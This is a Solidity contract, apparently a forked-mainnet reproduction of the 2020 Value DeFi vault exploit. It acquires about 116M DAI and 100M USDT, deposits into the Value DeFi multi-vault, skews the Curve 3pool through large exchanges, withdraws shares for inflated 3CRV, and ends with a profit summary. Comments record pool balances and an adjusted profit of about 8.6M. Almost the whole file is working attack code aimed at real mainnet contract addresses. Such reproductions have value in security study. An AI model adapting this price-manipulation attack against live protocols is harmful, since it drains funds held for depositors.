// SPDX-License-Identifier: AGPL-3.0-or-later
pragma solidity ^0.7.0;
pragma experimental ABIEncoderV2;
import "./interface.sol";
// Block 11256673
// Block index 59
// Timestamp Sat, 14 Nov 2020 15:36:30 +0000
// Gas price 39 gwei
// Gas limit 4120360


contract valueDeFi_attack {
    address EOA;
    address private constant WETHAddress = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address private constant USDTAddress = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address private constant USDCAddress = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address private constant DAIAddress = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address private constant UniswapV2Router02Address = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address private constant ValueMultiVaultBankAddress = 0x8764f2c305b79680CfCc3398a96aedeA9260f7ff;

    address private constant ValueDefiMultiVaultAddress = 0x55BF8304C78Ba6fe47fd251F37d7beb485f86d26;
    address private constant CurveFisUSDPoolAddress = 0xbEbc44782C7dB0a1A60Cb6fe97d0b483032FF1C7;
    address private constant MultiSatblesVaultAddress =  0xDdD7df28B1Fb668B77860B473aF819b03DB61101;
    address private constant Curve3crvAddress = 0x6c3F90f043a72FA612cbac8115EE7e52BDe6E490;
    address private constant SushiSwapAddress = 0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F;


    address private constant FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;

    IERC20 DAI = IERC20(DAIAddress);
    IERC20 CRV = IERC20(Curve3crvAddress);
    IERC20 USDC = IERC20(USDCAddress);
    IERC20 USDT = IERC20(USDTAddress);
    IERC20 ValueDefiMultiVault = IERC20(ValueDefiMultiVaultAddress);
    IValueMultiVaultBank ValueMultiVaultBank = IValueMultiVaultBank(ValueMultiVaultBankAddress);
    ICurveFi CurveFi = ICurveFi(CurveFisUSDPoolAddress);
    // IValueMultiVault ValueMultiVault = IValueMultiVault(ValueDefiMultiVaultAddress);

    // IMultiStablesVault MultiStablesVault  = IMultiStablesVault(MultiSatblesVaultAddress);

    IMultiStablesVault ValueMultiVault = IMultiStablesVault(ValueDefiMultiVaultAddress);

    string str1 = "";
    string str2 = "";
    string str3 = "";
    string str4 = "";
    string str5 = "";
    string str6 = "";

    string str89 = "";
    string str90 = "";
    string str91 = "";

    constructor() payable {
        require(msg.value == 1000000 ether, "loan amount does not match");
        DAI.approve(CurveFisUSDPoolAddress, 2**256 - 1);
        StandardToken(USDTAddress).approve(CurveFisUSDPoolAddress, 2**256 - 1);
        DAI.approve(ValueDefiMultiVaultAddress, 2**256 - 1);
        CRV.approve(CurveFisUSDPoolAddress, 2**256 - 1);
        StandardToken(USDTAddress).approve(UniswapV2Router02Address, 2**256 - 1);
        USDC.approve(CurveFisUSDPoolAddress, 2**256 - 1);
        EOA = msg.sender;
    }

    receive() external payable {}


    // flashloan amount: 116M DAI, 100M USDT
    function attack() public{
        address[] memory ad = new address[](2);
        ad[0] = WETHAddress;
        ad[1] = DAIAddress;
        IUniswapV2Router02(UniswapV2Router02Address).swapETHForExactTokens{value: 640000 ether}(116000000*10**18, ad, address(this), 2000000000);
        ad[0] = WETHAddress;
        ad[1] = USDTAddress;
        IUniswapV2Router02(UniswapV2Router02Address).swapETHForExactTokens{value: 360000 ether}(100000000 *10**6, ad, address(this),  2000000000);
        // -------------------------------------116M DAI and 100M USDT---------------------------------------------------------------------------------

        // action 1: DAI -> mvUSD  State: mvUSD
        //    State: mvUSD

        // str1 = CurveBalanceSummary();
        // str2 = ValueDeFiSummary();
        // uint sharesGot = ValueMultiVault.balanceOf(address(this));
        ValueMultiVaultBank.deposit(ValueDefiMultiVaultAddress, DAIAddress, 25000000*10**18, 0, false, 0);
        // sharesGot = (ValueMultiVault.balanceOf(address(this)) - sharesGot ) / 10 ** 18;
        // str3 = ValueDeFiSummary();
        // revert(appendWithSpace(appendWithSpace(str1, str2), appendWithSpace(str3, uint2str(sharesGot))));

        // DAI liquidity: 41202215 USDC liquidity: 108658258 USDT liquidity: 81079203 
        // totalSupply:  11306867  pool:  11321780 
        // totalSupply:  36230070  pool:  36280239
        // 24923203


        // action 2: DAI -> USDC   State: Curve
        //    State: Curve
        // str1 = CurveBalanceSummary();
        // str2 = ValueDeFiPool();
        // uint USDCgot = USDC.balanceOf(address(this));
        CurveFi.exchange(0, 1, 91000000 * 10 ** 18, 0);
        // USDCgot = (USDC.balanceOf(address(this)) - USDCgot) / 10 ** 6;
        // str3 = CurveBalanceSummary();
        // str4 = ValueDeFiPool();
        // revert(appendWithSpace(appendWithSpace(str1, str2), appendWithSpace(appendWithSpace(str3, str4), uint2str(USDCgot))));
        
        // DAI liquidity: 66200676 USDC liquidity: 108657373 USDT liquidity: 81078543  
        // pool:  36280239 
        // DAI liquidity: 157200676 USDC liquidity: 18354306 USDT liquidity: 81078543  
        // pool:  36381214 
        // 90285002



        // action 3: USDT -> USDC   State: Curve
        //    State: Curve
        // str1 = CurveBalanceSummary();
        // str2 = ValueDeFiPool();    
        // uint USDCgot = USDC.balanceOf(address(this));
        CurveFi.exchange(2, 1, 31000000 * 10 ** 6, 0);
        // USDCgot = (USDC.balanceOf(address(this)) - USDCgot) / 10 ** 6;
        // str3 = CurveBalanceSummary();
        // str4 = ValueDeFiPool();
        // revert(appendWithSpace(appendWithSpace(str1, str2), appendWithSpace(appendWithSpace(str3, str4), uint2str(USDCgot))));
        
        // DAI liquidity: 157200676 USDC liquidity: 18354306 USDT liquidity: 81078543  
        // pool:  36381214 
        // DAI liquidity: 157200676 USDC liquidity: 1019486 USDT liquidity: 112078543  
        // pool:  48108186 
        // 17331353




        // action 4: mvUSD -> 3CRV  State: mvUSD
        //     State: mvUSD
        // str1 = ValueDeFiSummary();
        // uint CRVgot = CRV.balanceOf(address(this));
        ValueMultiVault.withdrawFor(address(this), 24923203 * 10 ** 18, Curve3crvAddress, 0);
        // CRVgot = (CRV.balanceOf(address(this)) - CRVgot ) / 10 ** 18;
        // str2 = ValueDeFiSummary();
        // revert(appendWithSpace(appendWithSpace(str1, str2), uint2str(CRVgot)));

        // totalSupply:  36230070  pool:  48108186 
        // totalSupply:  11306867  pool:  15019118 
        // 33089068



        // action 5: USDC -> USDT   State: Curve
        //     State: Curve
        // str1 = CurveBalanceSummary();
        // str2 = ValueDeFiPool();    
        // uint USDTgot = USDT.balanceOf(address(this));
        CurveFi.exchange(1, 2, 17331353 * 10 ** 6, 0);
        // USDTgot = (USDT.balanceOf(address(this)) - USDTgot) / 10 ** 6;
        // str3 = CurveBalanceSummary();
        // str4 = ValueDeFiPool();
        // revert(appendWithSpace(appendWithSpace(str1, str2), appendWithSpace(appendWithSpace(str3, str4), uint2str(USDTgot))));
        // DAI liquidity: 157200676 USDC liquidity: 1019486 USDT liquidity: 112078543  
        // pool:  15019118 
        // DAI liquidity: 157200676 USDC liquidity: 18350839 USDT liquidity: 81132224  
        // pool:  3291717 
        // 30940127


        // action 6: USDC -> DAI   State: Curve
        //     State: Curve
        // str1 = CurveBalanceSummary();
        // str2 = ValueDeFiPool();    
        // uint DAIgot = DAI.balanceOf(address(this));
        CurveFi.exchange(1, 0, 90285002 * 10 ** 6, 0);
        // DAIgot = (DAI.balanceOf(address(this)) - DAIgot) / 10 ** 18;
        // str3 = CurveBalanceSummary();
        // str4 = ValueDeFiPool();
        // revert(appendWithSpace(appendWithSpace(str1, str2), appendWithSpace(appendWithSpace(str3, str4), uint2str(DAIgot))));
        
        // DAI liquidity: 157200676 USDC liquidity: 18350839 USDT liquidity: 81132224  
        // pool:  3291717 
        // DAI liquidity: 66255456 USDC liquidity: 108635841 USDT liquidity: 81132224  
        // pool:  3190362 
        // 90927026






        // // ==================== Swap ========================================
        CRV.approve(address(CurveFi), 0);
        CRV.approve(address(CurveFi), 2**256 - 1);
        if(USDT.balanceOf(address(this)) < 100000000 * 10 ** 6) {
            uint USDTimbalance = 100000000 * 10 ** 6 - USDT.balanceOf(address(this));
            uint[3] memory amounts = [uint(0), uint(0), uint(USDTimbalance)];
            CurveFi.remove_liquidity_imbalance(amounts, 2**256 - 1);
        }

        if(DAI.balanceOf(address(this)) < 116000000 * 10 ** 18) {
            uint DAIimbalance =  116000000 * 10 ** 18 - DAI.balanceOf(address(this));
            uint[3] memory amounts = [uint(DAIimbalance), uint(0), uint(0) ];
            CurveFi.remove_liquidity_imbalance(amounts, 2**256 - 1);
        }

        IOneSplitAudit OneSplitAudit = IOneSplitAudit(0xC586BeF4a0992C495Cf22e1aeEE4E446CECDee0E);
        uint USDCdiff = USDC.balanceOf(address(this));
        if(USDCdiff > 0){
          (uint returnAmount, uint256[] memory distribution) = OneSplitAudit.getExpectedReturn(address(USDC), address(USDT), USDCdiff, 10, 0);
          USDC.approve(address(OneSplitAudit), 0);
          USDC.approve(address(OneSplitAudit), 2**256 - 1);
          OneSplitAudit.swap(address(USDC), address(USDT), USDCdiff, 0, distribution, 0);      
        }

        
        if( DAI.balanceOf(address(this)) > 116000000 * 10 ** 18){
          uint DAIdiff = DAI.balanceOf(address(this)) - 116000000 * 10 ** 18;
          (uint returnAmount, uint256[] memory distribution) = OneSplitAudit.getExpectedReturn(address(DAI), address(USDT), DAIdiff, 10, 0);
          DAI.approve(address(OneSplitAudit), 0);
          DAI.approve(address(OneSplitAudit), 2**256 - 1);
          OneSplitAudit.swap(address(DAI), address(USDT), DAIdiff, 0, distribution, 0);      
        }


        revert(ProfitSummary());
        // 99940127 0 90927026 33089068
        // (99940127 -100M) + 0 +  (90927026 - 116M) + 33089068 * 1.02 = 8618002
        // USDT               USDC    DAI                CRV
        //  Adjusted Profit: 8618002

      }




    function ProfitSummary() internal returns (string memory _uintAsString){
        uint balance1 = USDT.balanceOf(address(this)) / 10 ** 6;
        uint balance2 = USDC.balanceOf(address(this)) / 10 ** 6;
        uint balance3 = DAI.balanceOf(address(this)) / 10 ** 18;
        uint balance4 = CRV.balanceOf(address(this)) / 10 ** 18;  // 1.02
        str89 = appendWithSpace(uint2str(balance1), uint2str(balance2));
        str90 = appendWithSpace(uint2str(balance3), uint2str(balance4));
        str90 = appendWithSpace(str89, str90);
        return str90;
    }

    function CurveBalanceSummary() internal returns (string memory _uintAsString){
        uint balance1 = CurveFi.balances(0) / 10 ** 18; // DAI
        uint balance2 = CurveFi.balances(1) / 10 ** 6; // USDC
        uint balance3 = CurveFi.balances(2) / 10 ** 6; // USDT
        str89 = append("DAI liquidity: ", uint2str(balance1));
        str90 = append(" USDC liquidity: ", uint2str(balance2));
        str91 = append(" USDT liquidity: ", uint2str(balance3));
        return append(append(str89, str90), str91);
    }

    function ValueDeFiSummary() internal returns (string memory _uintAsString) {
        uint totalSupply = ValueMultiVault.totalSupply() / 10 ** 18;
        uint _pool = ValueMultiVault.balance() / 10 ** 18;
        str89 = appendWithSpace("totalSupply: ", uint2str(totalSupply));
        str90 = appendWithSpace(" pool: ", uint2str(_pool));
        return appendWithSpace(str89, str90);
    }

    function ValueDeFiPool() internal returns (string memory _uintAsString) {
        uint _pool = ValueMultiVault.balance() / 10 ** 18;
        return appendWithSpace(" pool: ", uint2str(_pool));
    }

    function uint2str(uint _i) internal pure returns (string memory _uintAsString) {
        if (_i == 0) {
            return "0";
        }
        uint j = _i;
        uint len;
        while (j != 0) {
            len++;
            j /= 10;
        }
        bytes memory bstr = new bytes(len);
        uint k = len - 1;
        while (_i != 0) {
            bstr[k--] = byte(uint8(48 + _i % 10));
            _i /= 10;
        }
        return string(bstr);
    }

    function append(string memory a, string memory b) internal pure returns (string memory) {
        return string(abi.encodePacked(a, b));
    }

    function appendWithSpace(string memory a, string memory b) internal pure returns (string memory) {
        return append(a, append(" ", b));
    }


}
